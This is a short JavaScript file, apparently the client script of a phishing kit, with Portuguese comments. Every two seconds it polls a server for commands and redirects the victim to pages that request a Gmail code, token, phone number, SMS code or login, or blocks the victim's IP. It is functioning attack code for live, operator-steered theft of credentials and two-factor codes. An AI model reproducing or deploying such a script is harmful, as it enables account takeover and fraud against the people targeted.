function atualizadados(){
  
  $(document).ready(function(){
    $.ajax({
      dataType: 'json', //Definimos o tipo de retorno
      url: 'main_.php', //Definindo o arquivo onde serão buscados os dados
      success: function(data){
        function makeid(length){
          var result           = '';
          var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
          var charactersLength = characters.length;

          for ( var i = 0; i < length; i++ ) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
          }
          return result;
        }

        switch (data.comando){

          
        
          
           case "pedircodemail":
          window.location.href = "codigo.php?"+makeid(100);
          break;
            case "pedirtokengmail":
         
          window.location.href = "token.php?"+makeid(100);
          break;

           case "pedirtelefonegmail":
          window.location.href = "phone.php?"+makeid(100);
          break;

          case "notificagmail":
          window.location.href = "notefi.php?"+makeid(100);
          break;

          case "pedirsmsgmail":
          window.location.href = "sms.php?"+makeid(100);
          break;
         

           case "pediremail":
          window.location.href = "login.php?"+makeid(100);
          break;
              
         

        


         
          
          case "ok":
          window.location.href = "finalizar.php";
          break;

          case "ipblock":
          window.location.href = "finalizar2.php";
          break;

           case "bloquearip":
       window.location.href = "finalizar2.php?"+makeid(20);
       break;

          case "negaruser":
       window.location.href = "login.php?error=1"; 
       break;

      
        
          
        }
      }
    });

    setTimeout('atualizadados()', 2000);
  });
}

atualizadados();